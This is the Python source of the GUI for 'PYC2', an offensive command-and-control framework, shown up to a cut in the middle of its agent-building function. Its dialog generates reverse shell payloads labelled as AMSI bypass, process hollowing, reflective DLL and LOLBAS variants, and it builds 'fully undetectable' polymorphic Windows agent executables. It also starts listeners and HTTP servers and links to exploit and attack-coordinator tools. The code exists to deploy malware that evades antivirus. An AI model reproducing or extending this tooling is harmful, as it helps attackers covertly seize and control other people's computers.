#!/usr/bin/env python3
"""
PYC2 - Professional Command & Control Framework
Ultra-minimalistic design with professional dark theme
Fixed QThread destruction and improved GUI styling
"""

import sys
import os
import socket
import threading
import base64
import json
import time
import traceback
import re
import html
import select
import pickle
from datetime import datetime
from pathlib import Path
from PyQt6.QtWidgets import *
from PyQt6.QtCore import *
from PyQt6.QtGui import *

from elite_revshell_generator import EliteRevShellGenerator
from advanced_agent_generator import generate_undetectable_agent
from av_evasion_engine import AVEvasionEngine
from agent_details_dialog import AgentDetailsDialog
from icon_system import IconSystem, get_icon, setup_button_icon, setup_status_icon
from exploit_generator import ExploitGenerator
from payload_coordinator import PayloadCoordinator

def xor_encrypt_decrypt(data, key="SecureKey2024!!!"):
    """XOR encryption/decryption with proper UTF-8 handling"""
    # Ensure consistent encoding
    if isinstance(data, str):
        data_bytes = data.encode('utf-8', errors='replace')
    else:
        data_bytes = data

    if isinstance(key, str):
        key_bytes = key.encode('utf-8', errors='replace')
    else:
        key_bytes = key

    # XOR operation with proper bounds checking
    result = bytearray()
    for i in range(len(data_bytes)):
        result.append(data_bytes[i] ^ key_bytes[i % len(key_bytes)])

    # Return bytes for further processing
    return bytes(result)

class PayloadDialog(QDialog):
    """
    Elite Reverse Shell Generator Dialog mit modernsten FUD-Techniken
    Basiert auf Havoc C2, Cobalt Strike und anderen professionellen Frameworks
    """
    def __init__(self, parent=None, lhost="", lport=""):
        super().__init__(parent)
        self.setWindowTitle("Elite Reverse Shell Generator - Professional Grade")
        self.setMinimumWidth(850)
        self.setMinimumHeight(600)
        self.parent = parent
        
        try:
            self.generator = EliteRevShellGenerator()
            self.coordinator = PayloadCoordinator()
            self.exploit_gen = ExploitGenerator()
            self.current_payloads = []
        except Exception as e:
            QMessageBox.critical(self, "Initialization Error", str(e))
            self.generator = None
            self.coordinator = None
            self.exploit_gen = None
        
        self.setStyleSheet(parent.styleSheet() + """
            /* === Modern Dialog Specific Overrides === */
            QDialog {
                background-color: #1e1e1e;
                border: 2px solid #007acc;
                border-radius: 12px;
            }
            
            /* === Modern Payload Buttons === */
            QPushButton#payloadButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #8b5cf6, stop:1 #7c3aed);
                border: none;
                border-radius: 6px;
                padding: 10px 20px;
                color: #ffffff;
                font-weight: 600;
                font-size: 11px;
                min-height: 16px;
                min-width: 120px;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            QPushButton#payloadButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #a78bfa, stop:1 #8b5cf6);
                border: 1px solid #a78bfa;
            }
            QPushButton#payloadButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #7c3aed, stop:1 #6d28d9);
                border: 1px solid #7c3aed;
            }
            
            QPushButton#sendButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #4a5568, stop:1 #2d3748);
                border: 1px solid #2d3748;
                border-radius: 4px;
                padding: 0px;
                color: #ffffff;
                font-weight: 600;
                font-size: 12px;
                text-align: center;
            }
            QPushButton#sendButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #718096, stop:1 #4a5568);
                border: 1px solid #718096;
            }
            QPushButton#sendButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #2d3748, stop:1 #1a202c);
                border: 1px solid #2d3748;
            }
            
            /* === Advanced Function Buttons === */
            QPushButton#advancedButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #805ad5, stop:1 #6b46c1);
                border: 1px solid #6b46c1;
                border-radius: 4px;
                padding: 0px;
                color: #ffffff;
                font-weight: 600;
                font-size: 12px;
                text-align: center;
            }
            QPushButton#advancedButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #9f7aea, stop:1 #805ad5);
                border: 1px solid #9f7aea;
            }
            QPushButton#advancedButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #6b46c1, stop:1 #553c9a);
                border: 1px solid #6b46c1;
            }
            
            /* === Action Buttons === */
            QPushButton#actionButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #059669, stop:1 #047857);
                border: 1px solid #047857;
                border-radius: 4px;
                padding: 0px;
                color: #ffffff;
                font-weight: 600;
                font-size: 12px;
                text-align: center;
            }
            QPushButton#actionButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #10b981, stop:1 #059669);
                border: 1px solid #10b981;
            }
            QPushButton#actionButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #047857, stop:1 #065f46);
                border: 1px solid #047857;
            }
            
            /* === Stop/Close Buttons === */
            QPushButton#stopButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #dc2626, stop:1 #b91c1c);
                border: 1px solid #b91c1c;
                border-radius: 4px;
                padding: 0px;
                color: #ffffff;
                font-weight: 600;
                font-size: 12px;
                text-align: center;
            }
            QPushButton#stopButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #ef4444, stop:1 #dc2626);
                border: 1px solid #ef4444;
            }
            QPushButton#stopButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #b91c1c, stop:1 #991b1b);
                border: 1px solid #b91c1c;
            }
                border-radius: 4px;
                padding: 2px;
                color: #ffffff;
                font-weight: 600;
                font-size: 10px;
                text-align: center;
            }
            QPushButton#advancedButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #9f7aea, stop:1 #805ad5);
                border: 1px solid #9f7aea;
            }
            QPushButton#advancedButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #6b46c1, stop:1 #553c9a);
                border: 1px solid #6b46c1;
            }
            
            /* === Action Button === */
            QPushButton#actionButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #38b2ac, stop:1 #2c7a7b);
                border: 1px solid #2c7a7b;
                border-radius: 6px;
                padding: 8px 16px;
                color: #ffffff;
                font-weight: 600;
                font-size: 11px;
                min-height: 16px;
                min-width: 80px;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            QPushButton#actionButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #4fd1c7, stop:1 #38b2ac);
                border: 1px solid #4fd1c7;
            }
            QPushButton#actionButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #2c7a7b, stop:1 #285e61);
                border: 1px solid #2c7a7b;
            }
            
            /* === Modern Stop Button === */
            QPushButton#stopButton {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #ef4444, stop:1 #dc2626);
                border: none;
                border-radius: 6px;
                padding: 10px 20px;
                color: #ffffff;
                font-weight: 600;
                font-size: 11px;
                min-height: 16px;
                min-width: 80px;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            QPushButton#stopButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #f87171, stop:1 #ef4444);
                border: 1px solid #f87171;
            }
            QPushButton#stopButton:pressed {
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #dc2626, stop:1 #b91c1c);
                border: 1px solid #dc2626;
            }
            
            /* === Modern Group Box Headers === */
            QGroupBox {
                font-weight: 700;
                font-size: 13px;
                color: #ffffff;
                border: 2px solid #3e3e42;
                border-radius: 10px;
                margin-top: 16px;
                padding-top: 12px;
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #252526, stop:1 #1e1e1e);
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 16px;
                padding: 0 12px 0 12px;
                color: #007acc;
                background-color: #1e1e1e;
                font-weight: 700;
                border-radius: 4px;
            }
        """)
        self.setup_ui()
        self.connect_signals()
        
        # Initialisiere mit Werten
        self.lhost_input.setText(lhost)
        self.lport_input.setText(str(lport))
        
        # Lade verfügbare Optionen
        if self.generator:
            self.populate_categories()
            
        # Check if parent listener is running and update UI accordingly
        self.check_listener_status()

    def setup_ui(self):
        """Erstelle die Benutzeroberfläche"""
        layout = QVBoxLayout(self)
        layout.setSpacing(15)

        # Header
        header = QLabel("Elite Reverse Shell Generator")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header.setStyleSheet("font-size: 18px; font-weight: bold; color: #00ff41; margin: 10px;")
        layout.addWidget(header)

        # Connection Settings
        conn_group = QGroupBox("Connection Settings")
        conn_layout = QGridLayout()
        
        self.lhost_input = QLineEdit()
        self.lhost_input.setPlaceholderText("192.168.1.100")
        self.lport_input = QLineEdit()
        self.lport_input.setPlaceholderText("4444")
        
        conn_layout.addWidget(QLabel("LHOST:"), 0, 0)
        conn_layout.addWidget(self.lhost_input, 0, 1)
        conn_layout.addWidget(QLabel("LPORT:"), 0, 2)
        conn_layout.addWidget(self.lport_input, 0, 3)
        
        conn_group.setLayout(conn_layout)
        layout.addWidget(conn_group)

        # Payload Configuration
        config_group = QGroupBox("Payload Configuration")
        config_layout = QGridLayout()

        self.category_combo = QComboBox()
        self.subcategory_combo = QComboBox()
        self.encoder_combo = QComboBox()
        
        config_layout.addWidget(QLabel("Category:"), 0, 0)
        config_layout.addWidget(self.category_combo, 0, 1)
        config_layout.addWidget(QLabel("Sub-Category:"), 0, 2)
        config_layout.addWidget(self.subcategory_combo, 0, 3)
        
        config_layout.addWidget(QLabel("Encoder/Obfuscation:"), 1, 0)
        config_layout.addWidget(self.encoder_combo, 1, 1, 1, 3)
        
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)

        # Payload Selection und Preview
        payload_splitter = QSplitter(Qt.Orientation.Horizontal)
        
        # Payload Liste
        left_widget = QWidget()
        left_layout = QVBoxLayout(left_widget)
        left_layout.addWidget(QLabel("Available Payloads:"))
        
        self.payload_list = QListWidget()
        self.payload_list.setMaximumWidth(400)
        left_layout.addWidget(self.payload_list)
        
        # Info Label
        self.info_label = QLabel("Select a payload to see details")
        self.info_label.setWordWrap(True)
        self.info_label.setStyleSheet("color: #888; font-size: 12px; padding: 5px;")
        left_layout.addWidget(self.info_label)
        
        payload_splitter.addWidget(left_widget)
        
        # Generated Payload Preview
        right_widget = QWidget()
        right_layout = QVBoxLayout(right_widget)
        right_layout.addWidget(QLabel("Generated Payload:"))
        
        self.payload_preview = QTextEdit()
        self.payload_preview.setReadOnly(True)
        self.payload_preview.setFont(QFont("Consolas", 10))
        self.payload_preview.setPlaceholderText("Select a payload and configure options to generate...")
        right_layout.addWidget(self.payload_preview)
        
        # Listener Command
        listener_layout = QHBoxLayout()
        self.listener_combo = QComboBox()
        # c2py als Standard und erste Option - Standard für perfekte Funktionalität
        self.listener_combo.addItems(["c2py", "netcat", "ncat", "socat", "metasploit"])
        self.listener_combo.setCurrentIndex(0)  # Standard: c2py
        listener_layout.addWidget(QLabel("Listener:"))
        listener_layout.addWidget(self.listener_combo)
        
        self.listener_preview = QLineEdit()
        self.listener_preview.setReadOnly(True)
        self.listener_preview.setPlaceholderText("Listener command will appear here...")
        listener_layout.addWidget(self.listener_preview)
        
        right_layout.addLayout(listener_layout)
        payload_splitter.addWidget(right_widget)
        
        payload_splitter.setSizes([300, 700])  # Mehr Platz für Preview
        layout.addWidget(payload_splitter)

        # Kompakte Action Buttons - Minimales Layout für mehr Preview-Platz
        button_container = QWidget()
        button_container.setMaximumHeight(50)  # Stark begrenzte Höhe für Button-Panel
        button_layout = QHBoxLayout(button_container)
        button_layout.setSpacing(3)
        button_layout.setContentsMargins(0, 5, 0, 5)
        
        # Sehr kompakte Icon-Only Buttons
        self.generate_btn = QPushButton("🔄")
        self.generate_btn.setObjectName("sendButton")
        self.generate_btn.setFixedSize(24, 24)
        self.generate_btn.setToolTip("Generate Payload")
        
        self.copy_payload_btn = QPushButton("📋")
        self.copy_payload_btn.setObjectName("sendButton")
        self.copy_payload_btn.setFixedSize(24, 24)
        self.copy_payload_btn.setToolTip("Copy Payload")
        
        self.copy_listener_btn = QPushButton("🎧")
        self.copy_listener_btn.setObjectName("sendButton")
        self.copy_listener_btn.setFixedSize(24, 24)
        self.copy_listener_btn.setToolTip("Copy Listener Command")
        
        self.save_btn = QPushButton("💾")
        self.save_btn.setObjectName("sendButton")
        self.save_btn.setFixedSize(24, 24)
        self.save_btn.setToolTip("Save Payload")
        
        # Erweiterte Funktionen (Zeile 2)
        self.generate_exe_btn = QPushButton("🛡️")
        self.generate_exe_btn.setObjectName("advancedButton")
        self.generate_exe_btn.setFixedSize(24, 24)
        self.generate_exe_btn.setToolTip("Generate EXE")
        
        # Alle Buttons in einheitlicher Größe für gleichmäßiges Layout
        self.compiled_agent_btn = QPushButton("⚡")
        self.compiled_agent_btn.setObjectName("advancedButton")
        self.compiled_agent_btn.setFixedSize(24, 24)
        self.compiled_agent_btn.setToolTip("Compiled Agent")
        
        self.lolbas_btn = QPushButton("🔥")
        self.lolbas_btn.setObjectName("advancedButton")
        self.lolbas_btn.setFixedSize(24, 24)
        self.lolbas_btn.setToolTip("LOLBAS Payload")
        
        self.start_listener_btn = QPushButton("🚀")
        self.start_listener_btn.setObjectName("actionButton")
        self.start_listener_btn.setFixedSize(24, 24)
        self.start_listener_btn.setToolTip("Start Listener")
        
        # NEW: Attack Coordinator and Exploit Generator buttons
        self.attack_coordinator_btn = QPushButton("🎯")
        self.attack_coordinator_btn.setObjectName("advancedButton")
        self.attack_coordinator_btn.setFixedSize(24, 24)
        self.attack_coordinator_btn.setToolTip("Attack Coordinator")
        
        self.exploit_gen_btn = QPushButton("💥")
        self.exploit_gen_btn.setObjectName("advancedButton")
        self.exploit_gen_btn.setFixedSize(24, 24)
        self.exploit_gen_btn.setToolTip("Exploit Generator")
        
        self.http_server_btn = QPushButton("🌐")
        self.http_server_btn.setObjectName("actionButton")
        self.http_server_btn.setFixedSize(24, 24)
        self.http_server_btn.setToolTip("Start HTTP Server")
        
        self.close_btn = QPushButton("✕")
        self.close_btn.setObjectName("stopButton")
        self.close_btn.setFixedSize(24, 24)
        self.close_btn.setToolTip("Close Dialog")
        
        # Einheitliche Separatoren
        separator1 = QFrame()
        separator1.setFrameShape(QFrame.Shape.VLine)
        separator1.setFrameShadow(QFrame.Shadow.Sunken)
        separator1.setMaximumHeight(20)
        separator1.setMaximumWidth(2)
        
        separator2 = QFrame()
        separator2.setFrameShape(QFrame.Shape.VLine)
        separator2.setFrameShadow(QFrame.Shadow.Sunken)
        separator2.setMaximumHeight(20)
        separator2.setMaximumWidth(2)
        
        # Responsives Grid Layout: Alle Buttons in einer Zeile mit gleichmäßigen Abständen
        button_layout.addWidget(self.generate_btn)
        button_layout.addSpacing(8)  # Gleichmäßiger Abstand
        button_layout.addWidget(self.copy_payload_btn)
        button_layout.addSpacing(8)
        button_layout.addWidget(self.copy_listener_btn)
        button_layout.addSpacing(8)
        button_layout.addWidget(self.save_btn)
        button_layout.addSpacing(12)  # Größerer Abstand vor Separator
        button_layout.addWidget(separator1)
        button_layout.addSpacing(12)
        button_layout.addWidget(self.generate_exe_btn)
        button_layout.addSpacing(8)
        button_layout.addWidget(self.compiled_agent_btn)
        button_layout.addSpacing(8)
        button_layout.addWidget(self.lolbas_btn)
        button_layout.addSpacing(12)
        button_layout.addWidget(separator2)
        button_layout.addSpacing(12)
        button_layout.addWidget(self.start_listener_btn)
        button_layout.addSpacing(8)
        button_layout.addWidget(self.http_server_btn)
        button_layout.addSpacing(8)
        button_layout.addWidget(self.attack_coordinator_btn)
        button_layout.addSpacing(8)
        button_layout.addWidget(self.exploit_gen_btn)
        button_layout.addStretch()  # Flexible Abstand zum Close-Button
        button_layout.addWidget(self.close_btn)
        
        layout.addWidget(button_container)

    def connect_signals(self):
        """Verbinde alle Signal-Slot Verbindungen"""
        if self.generator:
            # Dropdown Changes
            self.category_combo.currentTextChanged.connect(self.on_category_changed)
            self.subcategory_combo.currentTextChanged.connect(self.on_subcategory_changed)
            self.encoder_combo.currentTextChanged.connect(self.generate_payload)
            self.listener_combo.currentTextChanged.connect(self.update_listener_command)
            
            # Input Changes
            self.lhost_input.textChanged.connect(self.generate_payload)
            self.lport_input.textChanged.connect(self.generate_payload)
            
            # List Selection
            self.payload_list.currentRowChanged.connect(self.on_payload_selected)
        
        # Button Clicks
        self.generate_btn.clicked.connect(self.generate_payload)
        self.copy_payload_btn.clicked.connect(self.copy_payload)
        self.copy_listener_btn.clicked.connect(self.copy_listener)
        self.generate_exe_btn.clicked.connect(self.generate_undetectable_exe)
        self.start_listener_btn.clicked.connect(self.start_c2py_listener)
        self.attack_coordinator_btn.clicked.connect(self.open_attack_coordinator)
        self.exploit_gen_btn.clicked.connect(self.open_exploit_generator)
        self.http_server_btn.clicked.connect(self.toggle_http_server)
        self.save_btn.clicked.connect(self.save_payload)
        self.compiled_agent_btn.clicked.connect(self.generate_compiled_agent)
        self.lolbas_btn.clicked.connect(self.generate_lolbas_payload)
        self.close_btn.clicked.connect(self.accept)

    def populate_categories(self):
        """Lade verfügbare Kategorien"""
        categories = self.generator.get_categories()
        self.category_combo.clear()
        self.category_combo.addItems(categories)
        
        # Setze C2PY Agents als Standard wenn verfügbar
        if "C2PY Agents" in categories:
            index = categories.index("C2PY Agents")
            self.category_combo.setCurrentIndex(index)
            
        if categories:
            self.on_category_changed()

    def on_category_changed(self):
        """Handle Kategorie-Änderung"""
        category = self.category_combo.currentText()
        if not category:
            return
            
        subcategories = self.generator.get_subcategories(category)
        self.subcategory_combo.clear()
        self.subcategory_combo.addItems(subcategories)
        
        # Show/hide c2py listener button based on category
        self.update_listener_button_visibility()
        
        if subcategories:
            self.on_subcategory_changed()

    def on_subcategory_changed(self):
        """Handle Unterkategorie-Änderung"""
        category = self.category_combo.currentText()
        subcategory = self.subcategory_combo.currentText()
        
        if not category or not subcategory:
            return
        
        # Update Encoder
        encoders = self.generator.get_available_encoders(category, subcategory)
        self.encoder_combo.clear()
        self.encoder_combo.addItems(encoders)
        
        # Update c2py listener button visibility
        self.update_listener_button_visibility()
        
        # Update Payload List
        payloads = self.generator.get_payloads(category, subcategory)
        self.payload_list.clear()
        
        for i, payload in enumerate(payloads):
            # Erstelle eine kurze Beschreibung für jeden Payload
            description = self.get_payload_description(payload, i)
            self.payload_list.addItem(f"Payload {i+1}: {description}")
        
        if payloads:
            self.payload_list.setCurrentRow(0)
            self.on_payload_selected()

    def get_payload_description(self, payload: str, index: int) -> str:
        """Erstelle eine kurze Beschreibung für einen Payload"""
        if "c2py" in payload.lower() or "SecureKey2024" in payload:
            descriptions = ["Standard C2PY Agent", "Persistent C2PY Agent", "Stealth C2PY Agent"]
            return descriptions[index] if index < len(descriptions) else "C2PY Agent"
        elif "Legacy Compatible" in payload:
            return "Legacy Compatible" if index == 0 else "Bash Agent"
        elif "AMSI" in payload:
            return "AMSI Bypass"
        elif "Process" in payload:
            return "Process Hollowing"
        elif "HTTP" in payload:
            return "HTTP/HTTPS Beacon"
        elif "Reflective" in payload:
            return "Reflective DLL"
        elif "Base64" in payload:
            return "Base64 Encoded"
        elif "while" in payload and "true" in payload:
            return "Persistent with Reconnect"
        elif "try" in payload and "catch" in payload:
            return "Error Handling"
        else:
            return "Standard Reverse Shell"

    def on_payload_selected(self):
        """Handle Payload-Auswahl"""
        current_row = self.payload_list.currentRow()
        if current_row == -1:
            return
            
        category = self.category_combo.currentText()
        subcategory = self.subcategory_combo.currentText()
        
        if category and subcategory:
            payloads = self.generator.get_payloads(category, subcategory)
            if current_row < len(payloads):
                payload_template = payloads[current_row]
                
                # Zeige Info über den Payload
                info = self.get_payload_info(payload_template)
                self.info_label.setText(info)
                
                # Generiere den Payload
                self.generate_payload()

    def get_payload_info(self, payload: str) -> str:
        """Erstelle Informationen über einen Payload"""
        info = []
        
        if "SecureKey2024" in payload or "c2py" in payload.lower():
            info.append("🎯 C2PY Native - Optimiert für den c2py Listener")
            info.append("🔐 XOR Verschlüsselung - Sichere Kommunikation")
            info.append("📊 JSON Metadata - Erweiterte Systeminformationen")
        if "ConnectToC2" in payload:
            info.append("🔄 Auto-Reconnect - Automatische Wiederverbindung")
        if "AMSI" in payload:
            info.append("🛡️ AMSI Bypass - Umgeht Windows Antimalware Scan Interface")
        if "Process" in payload:
            info.append("🔄 Process Hollowing - Injektion in legitimen Prozess")
        if "HTTP" in payload:
            info.append("🌐 HTTP/HTTPS - Web-basierte Kommunikation")
        if "try" in payload and "catch" in payload:
            info.append("⚡ Error Handling - Robuste Fehlerbehandlung")
        if "while" in payload and "true" in payload:
            info.append("🔄 Persistent - Automatische Wiederverbindung")
        if "Reflective" in payload:
            info.append("🪞 Reflective Loading - In-Memory Ausführung")
        if "bash -c" in payload:
            info.append("🐧 Linux/Unix - Für Unix-basierte Systeme")
        
        if not info:
            info.append("🚀 Standard Reverse Shell - Bewährte Technik")
        
        return "\n".join(info)

    def generate_payload(self):
        """Generiere den finalen Payload"""
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip()
        category = self.category_combo.currentText()
        subcategory = self.subcategory_combo.currentText()
        encoder = self.encoder_combo.currentText()
        current_row = self.payload_list.currentRow()

        if not all([lhost, lport, category, subcategory]) or current_row == -1:
            self.payload_preview.clear()
            self.payload_preview.setPlaceholderText("Please configure all options...")
            return

        try:
            lport_int = int(lport)
            payload = self.generator.generate_payload(category, subcategory, current_row, lhost, lport_int, encoder)
            
            # Format the payload für bessere Lesbarkeit
            formatted_payload = self.format_payload_display(payload)
            self.payload_preview.setText(formatted_payload)
            
            # Update Listener Command
            self.update_listener_command()
            
            # Special handling for c2py payloads - show connection info
            if "c2py" in category.lower() or "SecureKey2024" in payload:
                self.info_label.setText(
                    f"🎯 C2PY Native Payload Ready!\n"
                    f"🔐 XOR Encrypted communication\n"
                    f"📊 JSON metadata transmission\n"
                    f"🔄 Auto-reconnect capability\n"
                    f"📡 Target: {lhost}:{lport_int}\n"
                    f"✅ Ready for c2py listener connection"
                )
            
        except ValueError:
            self.payload_preview.setText("Error: Invalid port number")
        except Exception as e:
            self.payload_preview.setText(f"Error: {str(e)}")

    def format_payload_display(self, payload: str) -> str:
        """Formatiere Payload für bessere Anzeige"""
        if len(payload) > 200:
            # Für lange Payloads, füge Zeilenumbrüche hinzu
            formatted = payload.replace(';', ';\n').replace('&&', ' &&\n').replace('||', ' ||\n')
            return formatted
        return payload

    def update_listener_command(self):
        """Update den Listener Command"""
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip()
        listener_type = self.listener_combo.currentText()
        
        # Update c2py listener button visibility
        self.update_listener_button_visibility()
        
        if lhost and lport:
            try:
                lport_int = int(lport)
                listener_cmd = self.generator.generate_listener_command(lhost, lport_int, listener_type)
                self.listener_preview.setText(listener_cmd)
                
                # Special tooltip for c2py
                if listener_type == "c2py":
                    self.listener_preview.setToolTip(
                        "C2PY Listener - Optimized for encrypted communication\n"
                        "Supports XOR encryption, JSON metadata, and auto-reconnect"
                    )
                else:
                    self.listener_preview.setToolTip(f"{listener_type} listener command")
                    
            except ValueError:
                self.listener_preview.setText("Invalid port number")

    def update_listener_button_visibility(self):
        """Show/hide the c2py listener button based on selection"""
        category = self.category_combo.currentText()
        listener_type = self.listener_combo.currentText()
        
        # Zeige Button IMMER wenn c2py als Listener ausgewählt ist, 
        # oder wenn C2PY Agents als Kategorie gewählt ist
        show_button = listener_type == "c2py" or "C2PY" in category.upper()
        self.start_listener_btn.setVisible(show_button)
        
        # Zusätzlich: Zeige eine Statusmeldung
        if listener_type == "c2py":
            self.start_listener_btn.setText("🚀 Start C2PY Listener")
            self.start_listener_btn.setToolTip("Start c2py listener for optimal compatibility")
        else:
            self.start_listener_btn.setText("🚀 Start Listener")
            self.start_listener_btn.setToolTip("Start the selected listener type")

    def start_c2py_listener(self):
        """Start the c2py listener directly from the GUI"""
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip()
        
        if not lhost or not lport:
            QMessageBox.warning(self, "Warning", "Please enter LHOST and LPORT first!")
            return
        
        try:
            lport_int = int(lport)
            if not (1 <= lport_int <= 65535):
                QMessageBox.warning(self, "Warning", "Port must be between 1 and 65535!")
                return
        except ValueError:
            QMessageBox.warning(self, "Warning", "Invalid port number!")
            return
        
        # Validate IP address format
        try:
            import socket
            socket.inet_aton(lhost)
        except socket.error:
            if lhost != "0.0.0.0" and not lhost.replace('.', '').isdigit():
                QMessageBox.warning(self, "Warning", "Invalid IP address format!")
                return
        
        # Prüfe ob der Parent (Hauptfenster) die start_listener Methode hat
        if hasattr(self.parent, 'start_listener'):
            try:
                # Update die Host/Port Felder im Hauptfenster
                self.parent.lhost_input.setText(lhost)
                self.parent.lport_input.setText(str(lport_int))
                
                # Starte den Listener über das Hauptfenster
                self.parent.start_listener(lhost, lport_int)
                
                if self.parent:
                    self.parent.log_message(f"🚀 C2PY Listener started on {lhost}:{lport_int}")
                
                # Erfolgreiche Bestätigung mit detaillierten Informationen
                msg = QMessageBox(self)
                msg.setWindowTitle("Listener Started Successfully")
                msg.setIcon(QMessageBox.Icon.Information)
                msg.setText(f"C2PY Listener is now running!")
                msg.setInformativeText(f"Host: {lhost}\nPort: {lport_int}\n\nYour c2py agents are ready to connect.\nGenerated payloads will connect to this listener automatically.")
                msg.setStandardButtons(QMessageBox.StandardButton.Ok)
                msg.exec()
                
                # Optional: Schließe den Dialog nach erfolgreichem Start
                # self.accept()
                
            except Exception as e:
                error_msg = str(e)
                if "Address already in use" in error_msg or "Only one usage" in error_msg:
                    QMessageBox.critical(self, "Port Already in Use", 
                                       f"Port {lport_int} is already in use.\n\n"
                                       f"Please choose a different port or stop the existing listener.")
                else:
                    QMessageBox.critical(self, "Error", f"Failed to start listener:\n\n{error_msg}")
        else:
            # Fallback: Zeige den Listener Command zum Kopieren
            listener_cmd = f"python listener.py --lhost {lhost} --lport {lport_int}"
            QApplication.clipboard().setText(listener_cmd)
            
            msg = QMessageBox(self)
            msg.setWindowTitle("Listener Command")
            msg.setIcon(QMessageBox.Icon.Information)
            msg.setText("Run this command in a terminal:")
            msg.setInformativeText(f"{listener_cmd}\n\n(Command copied to clipboard)")
            msg.setStandardButtons(QMessageBox.StandardButton.Ok)
            msg.exec()
        

    def copy_payload(self):
        """Kopiere Payload in Zwischenablage"""
        payload = self.payload_preview.toPlainText()
        if payload and payload != "Please configure all options...":
            QApplication.clipboard().setText(payload)
            if self.parent:
                self.parent.log_message("✅ Payload copied to clipboard")
            QMessageBox.information(self, "Success", "Payload copied to clipboard!")

    def copy_listener(self):
        """Kopiere Listener Command in Zwischenablage"""
        listener = self.listener_preview.text()
        if listener and listener != "Invalid port number":
            QApplication.clipboard().setText(listener)
            if self.parent:
                self.parent.log_message("✅ Listener command copied to clipboard")
            QMessageBox.information(self, "Success", "Listener command copied to clipboard!")

    def save_payload(self):
        """Speichere Payload in Datei"""
        payload = self.payload_preview.toPlainText()
        if not payload or payload == "Please configure all options...":
            QMessageBox.warning(self, "Warning", "No payload to save!")
            return
            
        filename, _ = QFileDialog.getSaveFileName(
            self, "Save Payload", 
            f"payload_{self.category_combo.currentText()}_{int(time.time())}.txt",
            "Text Files (*.txt);;PowerShell Files (*.ps1);;Batch Files (*.bat);;All Files (*)"
        )
        
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"# Generated by Elite Reverse Shell Generator\n")
                    f.write(f"# Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"# Category: {self.category_combo.currentText()}\n")
                    f.write(f"# Subcategory: {self.subcategory_combo.currentText()}\n")
                    f.write(f"# Encoder: {self.encoder_combo.currentText()}\n")
                    f.write(f"# LHOST: {self.lhost_input.text()}\n")
                    f.write(f"# LPORT: {self.lport_input.text()}\n\n")
                    f.write(payload)
                    
                    # Füge auch Listener Command hinzu
                    listener = self.listener_preview.text()
                    if listener:
                        f.write(f"\n\n# Listener Command:\n# {listener}")
                
                if self.parent:
                    self.parent.log_message(f"✅ Payload saved to: {filename}")
                QMessageBox.information(self, "Success", f"Payload saved to:\n{filename}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save payload:\n{str(e)}")

    def generate_undetectable_exe(self):
        """Generate fully undetectable agent executable"""
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip()
        
        if not lhost or not lport:
            QMessageBox.warning(self, "Warning", "Please enter LHOST and LPORT first!")
            return
        
        try:
            lport_int = int(lport)
            if not (1 <= lport_int <= 65535):
                QMessageBox.warning(self, "Warning", "Port must be between 1 and 65535!")
                return
        except ValueError:
            QMessageBox.warning(self, "Warning", "Invalid port number!")
            return
        
        # Show progress dialog
        progress = QProgressDialog("Generating undetectable agent...", "Cancel", 0, 0, self)
        progress.setWindowTitle("Agent Generation")
        progress.setModal(True)
        progress.show()
        QApplication.processEvents()
        
        try:
            # Generate agent filename with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            agent_name = f"windows_agent_{timestamp}"
            
            if self.parent:
                self.parent.log_message(f"🛡️ Generating undetectable agent for {lhost}:{lport_int}")
            
            progress.setLabelText("Creating polymorphic code...")
            QApplication.processEvents()
            
            # Generate the agent
            source_code, exe_path = generate_undetectable_agent(lhost, lport_int, agent_name)
            
            progress.close()
            
            if exe_path and os.path.exists(exe_path):
                # Success
                msg = QMessageBox(self)
                msg.setIcon(QMessageBox.Icon.Information)
                msg.setWindowTitle("Agent Generated Successfully")
